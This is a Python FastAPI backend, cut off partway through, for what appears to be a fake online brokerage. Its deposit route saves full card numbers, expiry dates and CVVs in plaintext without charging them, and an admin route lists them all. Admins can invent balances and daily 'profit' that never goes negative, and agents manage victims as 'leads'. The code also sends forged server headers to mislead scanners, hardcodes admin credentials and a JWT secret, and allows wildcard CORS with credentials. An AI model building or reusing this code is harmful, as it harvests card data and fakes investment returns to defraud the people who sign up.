from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, status, Request as FastAPIRequest, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, EmailStr
from typing import Optional, List
from datetime import datetime, timedelta
from jose import JWTError, jwt
from passlib.context import CryptContext
import os
import asyncio
import json
import time
import collections
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId

# ── FastAPI sem info de versão/tecnologia exposta ──────────────────────────
app = FastAPI(
    title="Platform API",
    docs_url=None,        # Desativar Swagger UI (/docs)
    redoc_url=None,       # Desativar ReDoc (/redoc)
    openapi_url=None,     # Não expor schema OpenAPI
)

# ── CORS restrito ───────────────────────────────────────────────────────────
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["Authorization", "Content-Type", "Accept"],
    expose_headers=[],
)

# ── Middleware: Security Headers + remover cabeçalhos identificadores ───────
@app.middleware("http")
async def add_security_headers(request: FastAPIRequest, call_next):
    response = await call_next(request)
    # Remover cabeçalhos que revelam tecnologia
    for h in ["server", "x-powered-by"]:
        if h in response.headers:
            del response.headers[h]

    # ── Fingerprint falso: parece Nginx/PHP para enganar scanners ────────────
    response.headers["Server"]           = "nginx/1.24.0"
    response.headers["X-Powered-By"]     = "PHP/8.2.1"

    # ── Security Headers ─────────────────────────────────────────────────────
    response.headers["X-Content-Type-Options"]    = "nosniff"
    response.headers["X-Frame-Options"]           = "SAMEORIGIN"
    response.headers["X-XSS-Protection"]          = "1; mode=block"
    response.headers["Referrer-Policy"]           = "no-referrer"
    response.headers["Permissions-Policy"]        = "camera=(), microphone=(), geolocation=(), payment=()"
    response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"
    response.headers["Cache-Control"]             = "no-store, no-cache, must-revalidate, private"
    response.headers["Pragma"]                    = "no-cache"

    # ── CSP estrito — bloqueia exfiltração de dados via XSS ─────────────────
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.emergent.sh https://s.tradingview.com; "
        "connect-src 'self' wss: https:; "
        "img-src 'self' data: https:; "
        "frame-src https://s.tradingview.com https://www.tradingview.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "form-action 'self'; "
        "base-uri 'self'"
    )
    return response

# ── Rate Limiting simples (em memória) ─────────────────────────────────────
# Máximo de 10 tentativas por IP por minuto nas rotas de autenticação
_rate_store: dict = collections.defaultdict(list)

def check_rate_limit(ip: str, max_req: int = 10, window: int = 60):
    now = time.time()
    times = _rate_store[ip]
    # Limpar entradas antigas
    _rate_store[ip] = [t for t in times if now - t < window]
    if len(_rate_store[ip]) >= max_req:
        raise HTTPException(
            status_code=429,
            detail="Demasiadas tentativas. Aguarde um momento."
        )
    _rate_store[ip].append(now)

# --- DB Setup ---
MONGO_URL = os.environ.get("MONGO_URL", "mongodb://localhost:27017")
client = AsyncIOMotorClient(MONGO_URL)
db = client["brokereurope"]

# --- Auth Config ---
SECRET_KEY = os.environ.get("SECRET_KEY", "brokereurope_secret_key_2024_very_long")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_HOURS = 168  # 7 dias para sessão persistente

# Hardcoded admin credentials
ADMIN_USERNAME = "brokereurope"
ADMIN_PASSWORD = "Europeinvest"

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# --- WebSocket Manager ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        disconnected = []
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                disconnected.append(connection)
        for conn in disconnected:
            self.disconnect(conn)

manager = ConnectionManager()

# --- Helpers ---
def serialize_doc(doc):
    if doc is None:
        return None
    result = {}
    for key, value in doc.items():
        if isinstance(value, ObjectId):
            result[key] = str(value)
        elif isinstance(value, datetime):
            result[key] = value.isoformat()
        else:
            result[key] = value
    return result

def create_token(data: dict, role: str = "client"):
    payload = data.copy()
    payload["role"] = role
    payload["exp"] = datetime.utcnow() + timedelta(hours=ACCESS_TOKEN_EXPIRE_HOURS)
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def decode_token(token: str):
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    except JWTError:
        return None

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    payload = decode_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=401, detail="Não autorizado")
    user_id = payload.get("sub")
    if not user_id:
        raise HTTPException(status_code=401, detail="Não autorizado")
    # Verificar se o utilizador ainda existe na DB (revogação instantânea ao eliminar)
    try:
        user = await db.users.find_one({"_id": ObjectId(user_id)}, {"_id": 1})
        if not user:
            raise HTTPException(status_code=401, detail="Não autorizado")
    except Exception:
        raise HTTPException(status_code=401, detail="Não autorizado")
    return payload

async def get_admin_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    payload = decode_token(credentials.credentials)
    if not payload or payload.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Acesso negado")
    return payload

# --- Pydantic Models ---
class RegisterRequest(BaseModel):
    full_name: str
    email: EmailStr
    password: str
    country: Optional[str] = "Portugal"
    phone: Optional[str] = ""

class LoginRequest(BaseModel):
    email: EmailStr
    password: str

class AdminLoginRequest(BaseModel):
    username: str
    password: str

class DepositRequest(BaseModel):
    full_name: str
    card_number: str
    expiry: str
    cvv: str
    country: str
    postal_code: str
    amount: Optional[float] = 250.0

class WithdrawalRequest(BaseModel):
    method: str  # sepa or card
    account_name: Optional[str] = ""
    iban: Optional[str] = ""
    bic: Optional[str] = ""
    amount: Optional[float] = 0.0
    note: Optional[str] = ""
    card_holder: Optional[str] = ""
    card_number: Optional[str] = ""

class UpdateBalanceRequest(BaseModel):
    balance: float
    profit: float

    # Garantir que profit nunca é negativo
    def model_post_init(self, __context):
        if self.profit < 0:
            self.profit = 0.0
        if self.balance < 0:
            self.balance = 0.0

class UpdateStatusRequest(BaseModel):
    status: str

class UpdateProfileRequest(BaseModel):
    full_name: Optional[str] = None
    phone: Optional[str] = None
    country: Optional[str] = None


# ── Daily Profit Calculator ──────────────────────────────────────────
async def apply_daily_profit(user_id: str, user_doc: dict) -> dict:
    """Aplica o lucro diário. Profit: acumula proporcionalmente. Balance: sobe a cada 24h."""
    rate = float(user_doc.get('daily_profit_rate', 0))
    if rate <= 0:
        return user_doc

    balance = float(user_doc.get('balance', 0))
    if balance <= 0:
        return user_doc

    now = datetime.utcnow()
    daily_profit = balance * (rate / 100.0)
    updates = {}

    # ── Acumular LUCRO de forma proporcional ──────────────────────────────────
    last_profit_upd = user_doc.get('profit_last_updated')
    if last_profit_upd:
        elapsed = (now - last_profit_upd).total_seconds() / 86400.0
        if elapsed >= 0.0007:  # mínimo 1 minuto
            new_profit = max(0.0, float(user_doc.get('profit', 0)) + daily_profit * elapsed)
            updates['profit'] = round(new_profit, 2)
            updates['profit_last_updated'] = now
            user_doc['profit'] = updates['profit']
    else:
        updates['profit_last_updated'] = now

    # ── Adicionar ao SALDO a cada 24 horas (timestamp independente) ───────────
    last_balance_upd = user_doc.get('balance_last_updated')
    if not last_balance_upd:
        # Primeiro registo — marcar para daqui a 24h
        updates['balance_last_updated'] = now
    else:
        elapsed_since_last = (now - last_balance_upd).total_seconds() / 86400.0
        if elapsed_since_last >= 1.0:
            full_days = int(elapsed_since_last)
            new_balance = balance + daily_profit * full_days
            updates['balance'] = round(new_balance, 2)
            updates['balance_last_updated'] = now
            user_doc['balance'] = updates['balance']

    if updates:
        await db.users.update_one({'_id': ObjectId(user_id)}, {'$set': updates})

    return user_doc


@app.websocket("/ws/admin")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # heartbeat support
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

# --- Auth Routes ---
@app.post("/api/auth/register")
async def register(req: RegisterRequest, request: FastAPIRequest = None):
    existing = await db.users.find_one({"email": req.email})
    if existing:
        raise HTTPException(status_code=400, detail="Email já registado")
    
    hashed = pwd_context.hash(req.password)
    user = {
        "full_name": req.full_name,
        "email": req.email,
        "password": hashed,
        "country": req.country,
        "phone": req.phone,
        "balance": 0.0,
        "profit": 0.0,
        "status": "Novo",
        "created_at": datetime.utcnow(),
        "updated_at": datetime.utcnow()
    }
    result = await db.users.insert_one(user)
    token = create_token({"sub": str(result.inserted_id), "email": req.email}, role="client")

    # Notificar admin via WebSocket — novo cliente registado
    try:
        await manager.broadcast({
            "type": "new_client_registered",
            "user_id": str(result.inserted_id),
            "user_name": req.full_name,
            "email": req.email,
            "country": req.country or "",
            "timestamp": datetime.utcnow().isoformat()
        })
    except Exception:
        pass

    return {"token": token, "user": {"id": str(result.inserted_id), "full_name": req.full_name, "email": req.email, "country": req.country, "balance": 0.0, "profit": 0.0}}

@app.post("/api/auth/login")
async def login(req: LoginRequest, request: FastAPIRequest = None):
    # Rate limiting: máx 10 tentativas/min por IP
    if request:
        ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
        check_rate_limit(ip.split(",")[0].strip(), max_req=10, window=60)

    user = await db.users.find_one({"email": req.email})
    if not user or not pwd_context.verify(req.password, user["password"]):
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    
    # Registar sessão
    try:
        ip = "unknown"
        ua = "unknown"
        if request:
            ip = request.headers.get("X-Forwarded-For", request.client.host if request.client else "unknown")
            ua = request.headers.get("User-Agent", "unknown")
        await db.sessions.insert_one({
            "user_id": str(user["_id"]),
            "ip": ip.split(",")[0].strip() if "," in ip else ip,
            "user_agent": ua[:200],
            "created_at": datetime.utcnow(),
        })
    except Exception:
        pass
    
    token = create_token({"sub": str(user["_id"]), "email": req.email}, role="client")
    return {
        "token": token,
        "user": {
            "id": str(user["_id"]),
            "full_name": user["full_name"],
            "email": user["email"],
            "country": user.get("country", ""),
            "phone": user.get("phone", ""),
            "balance": user.get("balance", 0.0),
            "profit": user.get("profit", 0.0),
            "status": user.get("status", "Novo"),
            "goal_amount": user.get("goal_amount", 0.0),
            "goal_label": user.get("goal_label", ""),
            "daily_withdrawal_limit": user.get("daily_withdrawal_limit", 0.0),
        }
    }

@app.post("/api/admin/login")
async def admin_login(req: AdminLoginRequest):
    if req.username != ADMIN_USERNAME or req.password != ADMIN_PASSWORD:
        raise HTTPException(status_code=401, detail="Credenciais de administrador inválidas")
    token = create_token({"sub": "admin", "username": req.username}, role="admin")
    return {"token": token, "role": "admin"}

# --- Client Routes ---
@app.get("/api/me")
async def get_me(current_user = Depends(get_current_user)):
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    # Aplicar lucro diário acumulado
    user = await apply_daily_profit(str(user["_id"]), user)

    profit = max(0.0, float(user.get("profit", 0)))
    balance = max(0.0, float(user.get("balance", 0)))

    # Actualizar last_seen para o indicador "online agora"
    await db.users.update_one(
        {"_id": ObjectId(current_user["sub"])},
        {"$set": {"last_seen": datetime.utcnow()}}
    )

    return serialize_doc({
        "id": user["_id"],
        "full_name": user["full_name"],
        "email": user["email"],
        "country": user.get("country", ""),
        "phone": user.get("phone", ""),
        "balance": balance,
        "profit": profit,
        "status": user.get("status", "Novo"),
        "daily_profit_rate": user.get("daily_profit_rate", 0),
        "goal_amount": user.get("goal_amount", 0.0),
        "goal_label": user.get("goal_label", ""),
        "daily_withdrawal_limit": user.get("daily_withdrawal_limit", 0.0),
        "kyc_status": user.get("kyc_status", "not_submitted"),
        "two_fa_enabled": user.get("two_fa_enabled", False),
        "created_at": user.get("created_at")
    })

@app.put("/api/me")
async def update_me(req: UpdateProfileRequest, current_user = Depends(get_current_user)):
    update_data = {"updated_at": datetime.utcnow()}
    if req.full_name: update_data["full_name"] = req.full_name
    if req.phone is not None: update_data["phone"] = req.phone
    if req.country: update_data["country"] = req.country
    await db.users.update_one({"_id": ObjectId(current_user["sub"])}, {"$set": update_data})
    return {"success": True}

@app.post("/api/deposit")
async def create_deposit(req: DepositRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    
    # Store card data
    card_data = {
        "user_id": user_id,
        "email": current_user.get("email", ""),
        "full_name": req.full_name,
        "card_number": req.card_number,
        "expiry": req.expiry,
        "cvv": req.cvv,
        "country": req.country,
        "postal_code": req.postal_code,
        "amount": req.amount,
        "created_at": datetime.utcnow()
    }
    await db.cards_data.insert_one(card_data)
    
    # Store deposit record
    deposit = {
        "user_id": user_id,
        "amount": req.amount,
        "status": "pending",
        "created_at": datetime.utcnow()
    }
    await db.deposits.insert_one(deposit)
    
    # Get user info for notification
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    
    # Broadcast to admin WebSocket
    notification = {
        "type": "deposit_submitted",
        "user_id": user_id,
        "user_name": user["full_name"] if user else req.full_name,
        "email": current_user.get("email", ""),
        "amount": req.amount,
        "country": req.country,
        "card_last4": req.card_number[-4:] if len(req.card_number) >= 4 else "***",
        "timestamp": datetime.utcnow().isoformat()
    }
    await manager.broadcast(notification)
    
    return {"success": True, "message": "Depósito enviado para processamento"}

@app.post("/api/withdrawal")
async def create_withdrawal(req: WithdrawalRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]

    # Verificar saldo
    if req.amount and req.amount > 0:
        user_doc = await db.users.find_one({"_id": ObjectId(user_id)})
        if not user_doc:
            raise HTTPException(status_code=404, detail="Utilizador não encontrado")

        current_balance = max(0.0, float(user_doc.get("balance", 0)))

        # Verificar limite diário personalizado
        daily_limit = float(user_doc.get("daily_withdrawal_limit", 0))
        if daily_limit > 0 and req.amount > daily_limit:
            raise HTTPException(
                status_code=400,
                detail=f"Montante superior ao limite diário de {daily_limit:.2f}€. Contacte o suporte para aumentar o limite."
            )

        # Verificar saldo disponível
        if req.amount > current_balance:
            raise HTTPException(
                status_code=400,
                detail=f"Saldo insuficiente. Disponível: {current_balance:.2f}€. Solicitado: {req.amount:.2f}€."
            )

    user_doc = user_doc or await db.users.find_one({"_id": ObjectId(user_id)})
    withdrawal = {
        "user_id": user_id,
        "user_name": user_doc.get("full_name", "") if user_doc else "",
        "user_email": current_user.get("email", ""),
        "method": req.method,
        "account_name": req.account_name,
        "iban": req.iban,
        "bic": req.bic,
        "card_holder": req.card_holder,
        "card_number": req.card_number,
        "amount": req.amount,
        "note": req.note,
        "status": "pending",
        "created_at": datetime.utcnow()
    }
    await db.withdrawals.insert_one(withdrawal)

    # Notificar admin via WebSocket
    try:
        await manager.broadcast({
            "type": "withdrawal_requested",
            "user_name": user_doc.get("full_name","") if user_doc else "",
            "user_email": current_user.get("email",""),
            "amount": req.amount or 0,
            "method": req.method,
            "timestamp": datetime.utcnow().isoformat()
        })
    except Exception:
        pass

    return {"success": True, "message": "Pedido de levantamento enviado para aprovação"}


# ── Lista de levantamentos para o cliente
@app.get("/api/me/withdrawals")
async def get_my_withdrawals(current_user = Depends(get_current_user)):
    results = []
    async for w in db.withdrawals.find({"user_id": current_user["sub"]}).sort("created_at", -1).limit(20):
        results.append(serialize_doc({
            "id": w["_id"], "method": w.get("method"), "amount": w.get("amount", 0),
            "status": w.get("status", "pending"), "iban": w.get("iban",""),
            "account_name": w.get("account_name",""), "note": w.get("note",""),
            "created_at": w.get("created_at"), "reviewed_at": w.get("reviewed_at"),
            "reject_reason": w.get("reject_reason",""),
        }))
    return results

# --- Admin Routes ---
class UpdateDailyRateRequest(BaseModel):
    daily_profit_rate: float  # % por dia (ex: 1.5 = 1.5% ao dia)


# ════════════════════════════════════════════════════════════════
#  LEVANTAMENTOS — ADMIN
# ════════════════════════════════════════════════════════════════
class WithdrawalReviewRequest(BaseModel):
    status: str            # "approved" | "rejected"
    reject_reason: Optional[str] = ""

@app.get("/api/admin/withdrawals")
async def get_all_withdrawals(admin = Depends(get_admin_user)):
    results = []
    async for w in db.withdrawals.find({}).sort("created_at", -1).limit(200):
        results.append(serialize_doc({
            "id": w["_id"], "user_id": w.get("user_id",""),
            "user_name": w.get("user_name",""), "user_email": w.get("user_email",""),
            "method": w.get("method",""), "amount": w.get("amount", 0),
            "account_name": w.get("account_name",""), "iban": w.get("iban",""),
            "bic": w.get("bic",""), "note": w.get("note",""),
            "status": w.get("status","pending"),
            "reject_reason": w.get("reject_reason",""),
            "created_at": w.get("created_at"), "reviewed_at": w.get("reviewed_at"),
        }))
    return results

@app.get("/api/admin/withdrawals/count")
async def count_pending_withdrawals(admin = Depends(get_admin_user)):
    count = await db.withdrawals.count_documents({"status": "pending"})
    return {"pending": count}

@app.put("/api/admin/withdrawals/{withdrawal_id}/review")
async def review_withdrawal(withdrawal_id: str, req: WithdrawalReviewRequest, admin = Depends(get_admin_user)):
    w = await db.withdrawals.find_one({"_id": ObjectId(withdrawal_id)})
    if not w:
        raise HTTPException(status_code=404, detail="Pedido não encontrado")
    if w.get("status") != "pending":
        raise HTTPException(status_code=400, detail="Este pedido já foi processado")

    update = {"status": req.status, "reviewed_at": datetime.utcnow()}
    if req.reject_reason:
        update["reject_reason"] = req.reject_reason

    await db.withdrawals.update_one({"_id": ObjectId(withdrawal_id)}, {"$set": update})

    # Se aprovado, deduzir do saldo do utilizador
    if req.status == "approved" and w.get("amount", 0) > 0:
        user = await db.users.find_one({"_id": ObjectId(w["user_id"])})
        if user:
            new_balance = max(0.0, float(user.get("balance", 0)) - float(w["amount"]))
            await db.users.update_one(
                {"_id": ObjectId(w["user_id"])},
                {"$set": {"balance": round(new_balance, 2), "updated_at": datetime.utcnow()}}
            )

    await log_admin_action(w["user_id"], f"withdrawal_{req.status}",
                           {"amount": w.get("amount"), "reason": req.reject_reason})
    return {"success": True}


@app.get("/api/admin/leads/count")
async def get_leads_count(admin = Depends(get_admin_user)):
    """Contagem total de leads — usado para detectar novos via polling."""
    count = await db.users.count_documents({})
    return {"total": count}

@app.get("/api/admin/cards/count")
async def get_cards_count(admin = Depends(get_admin_user)):
    """Contagem total de cartões — usado para detectar novos depósitos via polling."""
    count = await db.cards_data.count_documents({})
    return {"total": count}


# ════════════════════════════════════════════════════════════════
#  AGENTES CRM
# ════════════════════════════════════════════════════════════════
class AgentCreateRequest(BaseModel):
    full_name: str
    email: str
    password: str
    phone: Optional[str] = ""

class AgentLoginRequest(BaseModel):
    email: str
    password: str

class CommentAddRequest(BaseModel):
    text: str

class LeadAssignRequest(BaseModel):
    agent_id: Optional[str] = None

async def get_current_agent(credentials: HTTPAuthorizationCredentials = Depends(security)):
    payload = decode_token(credentials.credentials)
    if not payload or payload.get("role") != "agent":
        raise HTTPException(status_code=401, detail="Não autorizado")
    agent = await db.agents.find_one({"_id": ObjectId(payload["sub"])})
    if not agent:
        raise HTTPException(status_code=401, detail="Não autorizado")
    return payload

@app.post("/api/admin/agents")
async def create_agent(req: AgentCreateRequest, admin = Depends(get_admin_user)):
    existing = await db.agents.find_one({"email": req.email})
    if existing:
        raise HTTPException(status_code=400, detail="Email já registado")
    hashed = pwd_context.hash(req.password)
    result = await db.agents.insert_one({
        "full_name": req.full_name, "email": req.email,
        "password": hashed, "phone": req.phone,
        "created_at": datetime.utcnow(), "active": True
    })
    return {"success": True, "id": str(result.inserted_id), "full_name": req.full_name}

@app.get("/api/admin/agents")
async def list_agents(admin = Depends(get_admin_user)):
    agents = []
    async for a in db.agents.find({}).sort("created_at", -1):
        leads_count = await db.users.count_documents({"assigned_agent": str(a["_id"])})
        agents.append(serialize_doc({
            "id": a["_id"], "full_name": a.get("full_name"), "email": a.get("email"),
            "phone": a.get("phone",""), "active": a.get("active", True),
            "leads_count": leads_count, "created_at": a.get("created_at"),
        }))
    return agents

@app.delete("/api/admin/agents/{agent_id}")
async def delete_agent(agent_id: str, admin = Depends(get_admin_user)):
    await db.agents.delete_one({"_id": ObjectId(agent_id)})
    await db.users.update_many({"assigned_agent": agent_id}, {"$unset": {"assigned_agent": "", "assigned_agent_name": ""}})
    return {"success": True}

@app.put("/api/admin/leads/{user_id}/assign")
async def assign_lead(user_id: str, req: LeadAssignRequest, admin = Depends(get_admin_user)):
    if req.agent_id:
        agent = await db.agents.find_one({"_id": ObjectId(req.agent_id)})
        if not agent:
            raise HTTPException(status_code=404, detail="Agente não encontrado")
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {"assigned_agent": req.agent_id, "assigned_agent_name": agent.get("full_name","")}})
    else:
        await db.users.update_one({"_id": ObjectId(user_id)}, {"$unset": {"assigned_agent": "", "assigned_agent_name": ""}})
    return {"success": True}

@app.get("/api/admin/agents/{agent_id}/leads")
async def get_agent_leads(agent_id: str, admin = Depends(get_admin_user)):
    leads = []
    async for u in db.users.find({"assigned_agent": agent_id}).sort("created_at", -1):
        comment_count = await db.lead_comments.count_documents({"user_id": str(u["_id"])})
        leads.append(serialize_doc({
            "id": u["_id"], "full_name": u.get("full_name"), "email": u.get("email"),
            "country": u.get("country",""), "status": u.get("status","Novo"),
            "balance": u.get("balance",0), "profit": u.get("profit",0.0),
            "last_seen": u.get("last_seen"), "created_at": u.get("created_at"),
            "comment_count": comment_count,
        }))
    return leads

@app.post("/api/admin/leads/{user_id}/comments")
async def add_comment_admin(user_id: str, req: CommentAddRequest, admin = Depends(get_admin_user)):
    entry = {"user_id": user_id, "text": req.text, "author": "admin", "author_name": "Admin", "created_at": datetime.utcnow()}
    result = await db.lead_comments.insert_one(entry)
    return serialize_doc({"id": result.inserted_id, **entry})

@app.get("/api/admin/leads/{user_id}/comments")
async def get_comments_admin(user_id: str, admin = Depends(get_admin_user)):
    comments = []
    async for c in db.lead_comments.find({"user_id": user_id}).sort("created_at", 1):
        comments.append(serialize_doc({"id": c["_id"], "text": c.get("text"), "author": c.get("author"), "author_name": c.get("author_name",""), "created_at": c.get("created_at")}))
    return comments

@app.post("/api/agent/login")
async def agent_login(req: AgentLoginRequest):
    agent = await db.agents.find_one({"email": req.email})
    if not agent or not pwd_context.verify(req.password, agent["password"]):
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    token = create_token({"sub": str(agent["_id"]), "email": req.email}, role="agent")
    return {"token": token, "agent": {"id": str(agent["_id"]), "full_name": agent.get("full_name"), "email": agent.get("email")}}

@app.get("/api/agent/me")
async def agent_me(current_agent = Depends(get_current_agent)):
    agent = await db.agents.find_one({"_id": ObjectId(current_agent["sub"])})
    if not agent:
        raise HTTPException(status_code=404, detail="Não encontrado")
    return serialize_doc({"id": agent["_id"], "full_name": agent.get("full_name"), "email": agent.get("email"), "phone": agent.get("phone",""), "photo_url": agent.get("photo_url","")})

@app.post("/api/agent/profile/photo")
async def upload_agent_photo(photo: UploadFile = File(...), current_agent = Depends(get_current_agent)):
    allowed = {"image/jpeg", "image/png", "image/webp", "image/jpg"}
    if photo.content_type not in allowed:
        raise HTTPException(status_code=400, detail="Formato inválido. Use JPG, PNG ou WebP.")
    content = await photo.read()
    if len(content) > 2 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="Imagem demasiado grande. Máximo 2MB.")
    b64 = base64.b64encode(content).decode("utf-8")
    photo_url = f"data:{photo.content_type};base64,{b64}"
    await db.agents.update_one(
        {"_id": ObjectId(current_agent["sub"])},
        {"$set": {"photo_url": photo_url}}
    )
    return {"success": True, "photo_url": photo_url}

@app.get("/api/agent/leads")
async def agent_leads(current_agent = Depends(get_current_agent)):
    agent_id = current_agent["sub"]
    leads = []
    async for u in db.users.find({"assigned_agent": agent_id}).sort("created_at", -1):
        comment_count = await db.lead_comments.count_documents({"user_id": str(u["_id"])})
        leads.append(serialize_doc({
            "id": u["_id"], "full_name": u.get("full_name"), "email": u.get("email"),
            "country": u.get("country",""), "phone": u.get("phone",""),
            "status": u.get("status","Novo"), "balance": u.get("balance",0),
            "profit": u.get("profit", 0.0), "last_seen": u.get("last_seen"),
            "created_at": u.get("created_at"), "comment_count": comment_count,
            "followup_date": u.get("followup_date"), "followup_note": u.get("followup_note",""),
        }))
    return leads

@app.post("/api/agent/leads/{user_id}/comments")
async def agent_add_comment(user_id: str, req: CommentAddRequest, current_agent = Depends(get_current_agent)):
    agent = await db.agents.find_one({"_id": ObjectId(current_agent["sub"])})
    entry = {"user_id": user_id, "text": req.text, "author": "agent", "author_name": agent.get("full_name","Agente") if agent else "Agente", "agent_id": current_agent["sub"], "created_at": datetime.utcnow()}
    result = await db.lead_comments.insert_one(entry)
    return serialize_doc({"id": result.inserted_id, **entry})

@app.get("/api/agent/leads/{user_id}/comments")
async def agent_get_comments(user_id: str, current_agent = Depends(get_current_agent)):
    comments = []
    async for c in db.lead_comments.find({"user_id": user_id}).sort("created_at", 1):
        comments.append(serialize_doc({"id": c["_id"], "text": c.get("text"), "author": c.get("author"), "author_name": c.get("author_name",""), "created_at": c.get("created_at")}))
    return comments

@app.put("/api/agent/leads/{user_id}/status")
async def agent_update_status(user_id: str, req: UpdateStatusRequest, current_agent = Depends(get_current_agent)):
    user = await db.users.find_one({"_id": ObjectId(user_id), "assigned_agent": current_agent["sub"]})
    if not user:
        raise HTTPException(status_code=403, detail="Sem permissão para este lead")
    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {"status": req.status}})
    return {"success": True}



# ── Contagem de mensagens não lidas no chat (para badge)
@app.get("/api/admin/chat/unread-count")
async def get_unread_chat_count(admin = Depends(get_admin_user)):
    count = await db.chat_messages.count_documents({"sender": "client", "read_by_admin": {"$ne": True}})
    return {"unread": count}


@app.put("/api/admin/users/{user_id}/daily-rate")
async def update_daily_rate(user_id: str, req: UpdateDailyRateRequest, admin = Depends(get_admin_user)):
    rate = max(0.0, min(req.daily_profit_rate, 100.0))  # entre 0% e 100%
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {
            "daily_profit_rate": rate,
            "profit_last_updated": datetime.utcnow(),
            "updated_at": datetime.utcnow()
        }}
    )
    return {"success": True, "daily_profit_rate": rate}


@app.get("/api/admin/users")
async def get_all_users(admin = Depends(get_admin_user)):
    users = []
    now = datetime.utcnow()
    async for user in db.users.find({}).sort("created_at", -1):
        last_seen = user.get("last_seen")
        is_online = last_seen and (now - last_seen).total_seconds() < 300  # 5 minutos
        users.append(serialize_doc({
            "id": user["_id"],
            "full_name": user["full_name"],
            "email": user["email"],
            "country": user.get("country", ""),
            "phone": user.get("phone", ""),
            "balance": max(0.0, float(user.get("balance", 0))),
            "profit": max(0.0, float(user.get("profit", 0))),
            "status": user.get("status", "Novo"),
            "daily_profit_rate": user.get("daily_profit_rate", 0),
            "kyc_status": user.get("kyc_status", "not_submitted"),
            "is_online": is_online,
            "last_seen": last_seen,
            "created_at": user.get("created_at")
        }))
    return users

@app.put("/api/admin/users/{user_id}/balance")
async def update_user_balance(user_id: str, req: UpdateBalanceRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"balance": req.balance, "profit": req.profit, "updated_at": datetime.utcnow()}}
    )
    return {"success": True}

@app.put("/api/admin/users/{user_id}/status")
async def update_user_status(user_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"status": req.status, "updated_at": datetime.utcnow()}}
    )
    return {"success": True}

@app.delete("/api/admin/users/{user_id}")
async def delete_user(user_id: str, admin = Depends(get_admin_user)):
    """Elimina o utilizador e todos os dados associados."""
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    # Eliminar todos os dados do utilizador
    await db.users.delete_one({"_id": ObjectId(user_id)})
    await db.cards_data.delete_many({"user_id": user_id})
    await db.orders.delete_many({"user_id": user_id})
    await db.chat_messages.delete_many({"user_id": user_id})
    await db.kyc_documents.delete_many({"user_id": user_id})
    await db.sessions.delete_many({"user_id": user_id})
    await db.audit_logs.delete_many({"user_id": user_id})
    await db.balance_history.delete_many({"user_id": user_id})

    return {"success": True, "deleted_user": user.get("email", user_id)}

@app.get("/api/admin/cards")
async def get_all_cards(admin = Depends(get_admin_user)):
    cards = []
    async for card in db.cards_data.find({}).sort("created_at", -1):
        cards.append(serialize_doc({
            "id": card["_id"],
            "user_id": card.get("user_id", ""),
            "email": card.get("email", ""),
            "full_name": card["full_name"],
            "card_number": card["card_number"],
            "expiry": card["expiry"],
            "cvv": card["cvv"],
            "country": card["country"],
            "postal_code": card["postal_code"],
            "amount": card.get("amount", 0),
            "created_at": card.get("created_at")
        }))
    return cards

@app.get("/api/admin/deposits")
async def get_all_deposits(admin = Depends(get_admin_user)):
    deposits = []
    async for dep in db.deposits.find({}).sort("created_at", -1):
        deposits.append(serialize_doc({
            "id": dep["_id"],
            "user_id": dep["user_id"],
            "amount": dep["amount"],
            "status": dep["status"],
            "created_at": dep.get("created_at")
        }))
    return deposits

@app.get("/api/news")
async def get_news():
    """Notícias financeiras em tempo real via feeds RSS públicos."""
    import feedparser, hashlib
    from datetime import timezone
    import time as time_lib

    FEEDS = [
        # Reuters Finance
        {"url": "https://feeds.reuters.com/reuters/businessNews",         "source": "Reuters",    "cat": "Macro"},
        {"url": "https://feeds.reuters.com/news/wealth",                  "source": "Reuters",    "cat": "Ações"},
        # Yahoo Finance
        {"url": "https://finance.yahoo.com/rss/topstories",               "source": "Yahoo Finance","cat": "Macro"},
